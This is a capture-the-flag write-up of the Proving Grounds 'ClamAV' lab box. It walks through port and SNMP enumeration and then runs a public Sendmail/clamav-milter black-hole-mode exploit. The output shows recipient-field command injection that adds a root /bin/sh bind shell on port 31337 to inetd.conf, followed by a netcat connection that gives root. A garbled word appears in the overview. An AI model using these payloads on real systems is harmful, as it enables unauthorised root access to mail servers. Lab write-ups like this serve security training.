---
layout: post
title: Proving Grounds- ClamAV
date: 2020-10-27 12:16:22 +0100
description: ClamAV is an easy Linux box featuring an outdated installation of the Clam AntiVirus suite. When the Sendmail mail filter is executed with the blackhole mode enabled it is possible to execute commands remotely due to an insecure popen call.
img: os.jpeg
fig-caption: ClamAV
categories: ProvingGrounds
tags: [Easy, Linux, Practice, CVE]
---
## Overview
ClamAV is an easy Lincisnckjds ux box featuring an outdated installation of the Clam AntiVirus suite. When the Sendmail mail filter is executed with the blackhole mode enabled it is possible to execute commands remotely due to an insecure popen call.

## Enumeration
The initial scan reveals a fair number of open ports
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/ClamAV]
└─$ sudo nmap -p- -T4 192.168.200.42
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-02 10:48 BST
Nmap scan report for 192.168.200.42
Host is up (0.093s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
80/tcp    open  http
139/tcp   open  netbios-ssn
199/tcp   open  smux
445/tcp   open  microsoft-ds
60000/tcp open  unknown
```
There are a few distractions on this box, first there is a webserver that leaves a message in binary translating as "The quick brown 🦊 jumps over 13 lazy 🐶.". Further fuzzing on the webserver did not reveal anything of interest. The samba server appears to be running an outdated version of samba, though this did not appear to match any vulnerable versions. Finally SSH appeared to also be running on an unusual port, though this did not appear to be vulnerable either. However the first breakthrough came when enumerating the SNMP port.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/ClamAV]
└─$ snmp-check 192.168.200.42
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 192.168.200.42:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 192.168.200.42
  Hostname                      : 0xbabe.local
  Description                   : Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
  Contact                       : Root <root@localhost> (configure /etc/snmp/snmpd.local.conf)
  Location                      : Unknown (configure /etc/snmp/snmpd.local.conf)
  Uptime snmp                   : 00:51:02.25
  Uptime system                 : 00:50:28.76
  System date                   : 2021-7-2 10:38:08.0

....

  3780                  runnable              clamd                 /usr/local/sbin/clamd                      
  3782                  runnable              clamav-milter         /usr/local/sbin/clamav-milter  --black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl
  3795                  runnable              nmbd                  /usr/sbin/nmbd        -D
```
As shown we can see ClamAV running with blackhole enabled, this is interesting as we know the name of the box is ClamAV. Also when we query searchsploit for the sendmail server that is running on port 25 we see a reference to clamav-milter with blackhole mode.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/ClamAV]
└─$ searchsploit sendmail                                                                                                                                1 ⨯
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Metasploit)                                               | multiple/remote/9913.rb
Sendmail 8.12.8 (BSD) - 'Prescan()' Remote Command Execution                                                               | linux/remote/24.c
....                                                                                                                       | ....
Sendmail 8.9.x/8.10.x/8.11.x/8.12.x - File Locking Denial of Service (1)                                                   | linux/dos/21476.c
Sendmail 8.9.x/8.10.x/8.11.x/8.12.x - File Locking Denial of Service (2)                                                   | linux/dos/21477.c
Sendmail with clamav-milter < 0.91.2 - Remote Command Execution                                                            | multiple/remote/4761.pl
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
## Foothold
We could use metasploit for this attack, but if we attempt first without it and choose the perl script. I had to remove the comments in the script and add the hashbang `#!/usr/bin/perl` then I could execute it with no other changes.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/ClamAV]
└─$ ./4761.pl 192.168.200.42
Sendmail w/ clamav-milter Remote Root Exploit
Copyright (C) 2007 Eliteboy
Attacking 192.168.200.42...
220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Fri, 2 Jul 2021 10:33:15 -0400; (No UCE/UBE) logging access from: [192.168.49.200](FAIL)-[192.168.49.200]
250-localhost.localdomain Hello [192.168.49.200], pleased to meet you
250-ENHANCEDSTATUSCODES
250-PIPELINING
250-EXPN
250-VERB
250-8BITMIME
250-SIZE
250-DSN
250-ETRN
250-DELIVERBY
250 HELP
250 2.1.0 <>... Sender ok
250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... Recipient ok
250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
354 Enter mail, end with "." on a line by itself
250 2.0.0 162EXFhs004343 Message accepted for delivery
221 2.0.0 localhost.localdomain closing connection
```
From the output it looks like it bound a listener to port `31337`, so when attempting to connect to it using netcat it resulted in a shell.
```
┌──[192.168.49.200]-(calxus㉿calxus)-[~/PG/ClamAV]
└─$ nc -nv 192.168.200.42 31337
(UNKNOWN) [192.168.200.42] 31337 (?) open
whoami
root
```

## Privilege Escalation

Privilege escalation is not required as we got a root shell directly from the foothold
